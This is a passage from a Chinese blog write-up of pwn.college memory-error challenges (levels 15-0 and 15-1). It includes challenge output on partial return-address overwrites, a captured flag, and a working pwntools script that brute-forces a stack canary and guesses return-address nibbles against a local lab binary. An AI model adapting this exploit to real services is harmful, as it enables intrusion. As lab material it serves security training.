workaround: we can overwrite the least significant byte\nof the saved <span class="hljs-keyword">return</span> address, which we can know from debugging the binary,\nto retarget the <span class="hljs-keyword">return</span> to main to any instruction that shares the other <span class="hljs-number">7</span> bytes.\nSince that last byte will be constant between executions (due to page alignment),\nthis will always work.\nIf the address we want to redirect execution to is a bit farther away from\nthe saved <span class="hljs-keyword">return</span> address, and we need to write two bytes, <span class="hljs-keyword">then</span> one of those\nnibbles (the fourth least-significant one) will be a guess, and it will be\nincorrect <span class="hljs-number">15</span> of <span class="hljs-number">16</span> times.\nThis is okay: we can just run our exploit a few\ntimes <span class="hljs-built_in">until</span> it works (statistically, <span class="hljs-built_in">after</span> <span class="hljs-number">8</span> times or so).\nOne caveat <span class="hljs-built_in">in</span> this challenge is that the win_authed() function must <span class="hljs-built_in">first</span> auth:\nit only lets you win <span class="hljs-keyword">if</span> you provide it <span class="hljs-built_in">with</span> the argument <span class="hljs-number">0x1337</span>.\nSpeifically, the win_authed() function looks something like:\n    void win_authed(int token)\n    &#123;\n      <span class="hljs-keyword">if</span> (token != <span class="hljs-number">0x1337</span>) <span class="hljs-keyword">return</span>;\n      puts(<span class="hljs-string">&quot;You win! Here is your flag: &quot;</span>);\n      sendfile(<span class="hljs-number">1</span>, open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);\n      puts(<span class="hljs-string">&quot;&quot;</span>);\n    &#125;\n\nSo how <span class="hljs-built_in">do</span> you pass the check? There *is* a way, and we will cover it later,\nbut <span class="hljs-keyword">for</span> now, we will simply bypass it! You can overwrite the <span class="hljs-keyword">return</span> address\nwith *any* value (<span class="hljs-built_in">as</span> long <span class="hljs-built_in">as</span> it points to executable code), not just the start\nof functions. <span class="hljs-keyword">Let</span>\&#x27;s overwrite past the token check <span class="hljs-built_in">in</span> win!\n\nTo <span class="hljs-built_in">do</span> this, we will need to analyze the program <span class="hljs-built_in">with</span> objdump, identify <span class="hljs-keyword">where</span>\nthe check is <span class="hljs-built_in">in</span> the win_authed() function, find the address <span class="hljs-built_in">right</span> <span class="hljs-built_in">after</span> the check,\nand write that address over the saved <span class="hljs-keyword">return</span> address.\n\nGo ahead and find this address now. When you\&#x27;re ready, input a buffer overflow\nthat will overwrite the saved <span class="hljs-keyword">return</span> address (<span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6de18</span>, <span class="hljs-number">136</span> bytes into the buffer)\nwith the correct value.\n\nSend your payload (up to <span class="hljs-number">138</span> bytes)!\nYou sent <span class="hljs-number">138</span> bytes!\nLet\&#x27;s see what happened <span class="hljs-built_in">with</span> the stack:\n\n+---------------------------------+-------------------------+--------------------+\n|                  <span class="hljs-type">Stack</span> location |            <span class="hljs-type">Data</span> (bytes) |      <span class="hljs-type">Data</span> (LE int) |<span class="hljs-type">\n</span>+---------------------------------+-------------------------+--------------------+\n| <span class="hljs-type">0x00007ffda0d6dd50</span> (rsp+<span class="hljs-number">0x0000</span>) | <span class="hljs-type">60</span> dd d6 a0 fd <span class="hljs-number">7</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00007ffda0d6dd60</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd58</span> (rsp+<span class="hljs-number">0x0008</span>) | <span class="hljs-type">68</span> ef d6 a0 fd <span class="hljs-number">7</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00007ffda0d6ef68</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd60</span> (rsp+<span class="hljs-number">0x0010</span>) | <span class="hljs-type">58</span> ef d6 a0 fd <span class="hljs-number">7</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00007ffda0d6ef58</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd68</span> (rsp+<span class="hljs-number">0x0018</span>) | <span class="hljs-type">a0</span> <span class="hljs-number">16</span> <span class="hljs-number">0</span>c d5 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00000001d50c16a0</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd70</span> (rsp+<span class="hljs-number">0x0020</span>) | <span class="hljs-type">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x0000000000000001</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd78</span> (rsp+<span class="hljs-number">0x0028</span>) | <span class="hljs-type">23</span> <span class="hljs-number">17</span> <span class="hljs-number">0</span>c d5 <span class="hljs-number">8</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x0000008ad50c1723</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd80</span> (rsp+<span class="hljs-number">0x0030</span>) | <span class="hljs-type">8a</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x000000000000008a</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd88</span> (rsp+<span class="hljs-number">0x0038</span>) | <span class="hljs-type">90</span> dd d6 a0 fd <span class="hljs-number">7</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00007ffda0d6dd90</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd90</span> (rsp+<span class="hljs-number">0x0040</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd98</span> (rsp+<span class="hljs-number">0x0048</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dda0</span> (rsp+<span class="hljs-number">0x0050</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dda8</span> (rsp+<span class="hljs-number">0x0058</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddb0</span> (rsp+<span class="hljs-number">0x0060</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddb8</span> (rsp+<span class="hljs-number">0x0068</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddc0</span> (rsp+<span class="hljs-number">0x0070</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddc8</span> (rsp+<span class="hljs-number">0x0078</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddd0</span> (rsp+<span class="hljs-number">0x0080</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddd8</span> (rsp+<span class="hljs-number">0x0088</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dde0</span> (rsp+<span class="hljs-number">0x0090</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dde8</span> (rsp+<span class="hljs-number">0x0098</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddf0</span> (rsp+<span class="hljs-number">0x00a0</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddf8</span> (rsp+<span class="hljs-number">0x00a8</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6de00</span> (rsp+<span class="hljs-number">0x00b0</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6de08</span> (rsp+<span class="hljs-number">0x00b8</span>) | <span class="hljs-type">00</span> d9 <span class="hljs-number">2</span>d <span class="hljs-number">0</span>a <span class="hljs-number">01</span> <span class="hljs-number">8</span>e <span class="hljs-number">2</span>b f2 | <span class="hljs-type">0xf22b8e010a2dd900</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6de10</span> (rsp+<span class="hljs-number">0x00c0</span>) | <span class="hljs-type">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> | <span class="hljs-type">0x4242424242424242</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6de18</span> (rsp+<span class="hljs-number">0x00c8</span>) | <span class="hljs-type">96</span> <span class="hljs-number">1</span>f <span class="hljs-number">26</span> cb c1 <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x000055c1cb261f96</span> |<span class="hljs-type">\n</span>+---------------------------------+-------------------------+--------------------+\nThe program\&#x27;s memory status:\n- the input buffer starts <span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6dd90</span>\n- the saved frame pointer (of main) is <span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6de10</span>\n- the saved <span class="hljs-keyword">return</span> address (previously to main) is <span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6de18</span>\n- the saved <span class="hljs-keyword">return</span> address is now pointing to <span class="hljs-number">0x55c1cb261f96</span>.\n- the canary is stored <span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6de08</span>.\n- the canary value is now <span class="hljs-number">0xf22b8e010a2dd900</span>.\n- the address of win_authed() is <span class="hljs-number">0x55c1cb261f7a</span>.\n\nIf you have managed to overwrite the <span class="hljs-keyword">return</span> address <span class="hljs-built_in">with</span> the correct value,\nchallenge() will jump straight to win_authed() when it returns.\nLet\&#x27;s <span class="hljs-built_in">try</span> it now!\n\nGoodbye!\nYou win! Here is your flag:\npwn.college&#123;<span class="hljs-number">0</span>TtgTnRU5N_7GHfxCH9SAvgrlhf<span class="hljs-number">.01</span>NxMDL1cTMzEzW&#125;\n\n\n&#x27;<br>[*] Stopped process &#x27;/challenge/babymem_level15<span class="hljs-number">.0</span>&#x27; (pid <span class="hljs-number">661</span>)<br>hacker@memory-errors~level15<span class="hljs-number">-0</span>:~$ <br></code></pre></td></tr></table></figure>

<h1 id="15-1"><a href="#15-1" class="headerlink" title="15-1"></a>15-1</h1><p>用 15-0 的脚本跑这个挑战总是失败，但是不知道错在哪，后来发现或许不该把最后四位写死。由于最后的地址是A BBB形式，尝试把 A 遍历最终通过了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>host = <span class="hljs-string">&#x27;localhost&#x27;</span> <br>port = <span class="hljs-number">1337</span>  <br><br><span class="hljs-comment"># 连接到服务</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>():</span><br>    <span class="hljs-keyword">return</span> remote(host, port)<br><br><span class="hljs-comment"># 尝试一个字节，看看程序是否崩溃</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_byte</span>(<span class="hljs-params">p, payload</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode() )<br>    p.send(payload)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        response = p.recvall(timeout=<span class="hljs-number">0.15</span>)<span class="hljs-comment"># not recv but recvall!</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smash&#x27;</span> <span class="hljs-keyword">in</span> response :<span class="hljs-comment"># timeout may can  be smaller </span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> EOFError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 爆破金丝雀</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_force_canary</span>():</span><br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span>  <span class="hljs-comment"># 已知最高位字节是0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>        <span class="hljs-comment">#found = False</span><br>        <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(E):<br>            p = connect()<br>            payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">24</span> + canary + <span class="hljs-built_in">bytes</span>([byte])<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-keyword">if</span> try_byte(p, payload):<br>                canary += <span class="hljs-built_in">bytes</span>([byte])<br>                <span class="hljs-comment">#found = True</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found byte <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">bytes</span>([byte]).<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>                p.close()<br>                <span class="hljs-keyword">break</span><br>            p.close()<br>    <span class="hljs-keyword">return</span> canary<br><br><span class="hljs-comment"># 主攻击逻辑</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    s = process(<span class="hljs-string">&#x27;/challenge/babymem_level15.1&#x27;</span>)<br>    canary = brute_force_canary()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found canary: <span class="hljs-subst">&#123;canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-comment">#pause(10)</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>            p = connect()<br>            <span class="hljs-comment"># 发送正确的payload，包括金丝雀和覆盖返回地址</span><br>            payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">24</span> + canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span><br>            payload += p16(<span class="hljs-number">0x1000</span>*i+<span class="hljs-number">0x333</span>)  <br>            <span class="hljs-built_in">print</span>(payload)<br>            p.sendlineafter(<span class="hljs-string">&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode() )<br>        <span class="hljs-comment"># p.sendline(str(len(payload)).encode() )</span><br>            p.recvuntil(<span class="hljs-string">&#x27;bytes)!&#x27;</span>)<br>            p.send(payload)<br><br>            re = p.recvall(<span class="hljs-number">0.2</span>)<br>            <span class="hljs-comment">#print(re)</span><br>            <span class="hljs-keyword">if</span> re.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">print</span>(re)<br>                <span class="hljs-keyword">break</span><br><br>            p.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br>    <br></code></pre></td></tr></table></figure>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>gdb动态调试（或 ida）获得读入缓冲区时的 rbp 和 rsp，以及 buf 地址，从而计算出距离 rbp 的偏移</p>

              
            </div>
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>pwn college 刷题记录： memory-errors</div>
      <div>http://gls.show/p/3bd14ce9/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>郭佳明</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年5月30日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/p/a2494a57/" title="pwn college 刷题记录：debugging refresher">
                        <span class="hidden-mobile">pwn college 刷题记录：debugging refresher</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'LaPhilosophie/gls.show');
      s.setAttribute('issue-term', 'pathname');
      
      s.setAttribute('label', 'utterances');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  








    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
</div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
    <!-- 备案信息 ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      京ICP备2021035969号
    </a>
  </span>
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>






  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script>
  (function() {
    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
    var enableCopy = CONFIG.copy_btn;
    if (!enableLang && !enableCopy) {
      return;
    }

    function getBgClass(ele) {
      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
    }

    var copyTmpl = '';
    copyTmpl += '<div class="code-widget">';
    copyTmpl += 'LANG';
    copyTmpl += '</div>';
    jQuery('.markdown-body pre').each(function() {
      var $pre = jQuery(this);
      if ($pre.find('code.mermaid').length > 0) {
        return;
      }
      if ($pre.find('span.line').length > 0) {
        return;
      }

      var lang = '';

      if (enableLang) {
        lang = CONFIG.code_language.default;
        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
          lang = $pre[0].children[0].classList[1];
        } else if ($pre[0].getAttribute('data-language')) {
          lang = $pre[0].getAttribute('data-language');
        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
          lang = $pre[0].children[0].classList[1];
          $pre.parent().addClass('code-wrapper');
        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
          $pre.wrap('<div class="code-wrapper"></div>');
        }
        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
      }
      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));

      if (enableCopy) {
        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
          var clipboard = new window.ClipboardJS('.copy-btn', {
            target: function(trigger) {
              var nodes = trigger.parentNode.childNodes;
              for (var i = 0; i < nodes.length; i++) {
                if (nodes[i].tagName === 'CODE') {
                  return nodes[i];
                }
              }
            }
          });
          clipboard.on('success', function(e) {
            e.clearSelection();
            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
            setTimeout(function() {
              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
            }, 2000);
          });
        });
      }
    });
  })();
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
